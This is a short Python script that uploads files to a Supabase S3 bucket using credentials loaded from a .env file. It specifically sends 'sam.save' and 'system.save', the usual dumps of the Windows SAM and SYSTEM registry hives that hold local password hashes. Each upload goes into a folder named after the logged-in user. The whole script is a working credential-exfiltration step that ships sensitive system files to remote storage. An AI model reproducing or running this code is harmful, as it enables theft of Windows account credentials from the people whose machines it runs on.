import boto3
import os
from dotenv import load_dotenv

# Load .env values
load_dotenv()

# Read values from .env
bucket_name = os.getenv("BUCKET_NAME")
region = os.getenv("S3_REGION")
endpoint_url = os.getenv("SUPABASE_URL")
access_key = os.getenv("S3_ACCESS_KEY_ID")
secret_key = os.getenv("S3_SECRET_ACCESS_KEY")

# Get the current user name
user_name = os.getlogin()

# Init boto3 client
s3 = boto3.client(
    "s3",
    aws_access_key_id=access_key,
    aws_secret_access_key=secret_key,
    region_name=region,
    endpoint_url=endpoint_url
)

# Files to upload
files_to_upload = ["sam.save", "system.save"]

# Upload each file into the user's folder
for filename in files_to_upload:
    folder_path = f"{user_name}/{filename}"

    try:
        # Open the file in binary mode
        with open(filename, 'rb') as file:
            # Upload the file in binary mode
            s3.upload_fileobj(file, bucket_name, folder_path)
        print(f"[✓] {filename} uploaded to Supabase S3 in folder {user_name}.")
    except Exception as e:
        print(f"[✗] Failed to upload {filename}: {e}")